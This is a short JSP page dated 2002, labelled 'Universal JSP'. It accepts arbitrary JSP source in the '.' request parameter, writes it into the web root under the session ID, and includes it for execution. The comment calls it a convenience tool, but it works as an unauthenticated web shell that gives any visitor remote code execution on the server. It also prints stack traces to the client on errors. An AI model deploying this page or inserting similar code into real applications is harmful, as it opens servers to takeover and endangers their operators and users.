<%
  /**
   *   Universal JSP
   *   @description runs a jsp passed in '.' parameter; other parameters go straight to the jsp to run.
   *
   *   @author vpatryshev
   *   @copyright Vlad Patryshev, 2002
   */

  String value = (String)request.getParameter(".");

  if (value != null) {
    String filename = session.getId() + ".jsp";
    java.io.File sourcefile = new java.io.File("webapps/ROOT", filename);
    try {
      java.io.PrintWriter pw = new java.io.PrintWriter(new java.io.FileOutputStream(sourcefile));
      pw.write(value);
      pw.close();
%><jsp:include page="<%=filename%>" flush="true"/><%
  } catch (Exception e) {
    out.print("***** Error: problems with file permissions for this jsp<br>" + e + "<br>");
    e.printStackTrace(new java.io.PrintWriter(out));
  }
} else {
  %>;)<%
}%>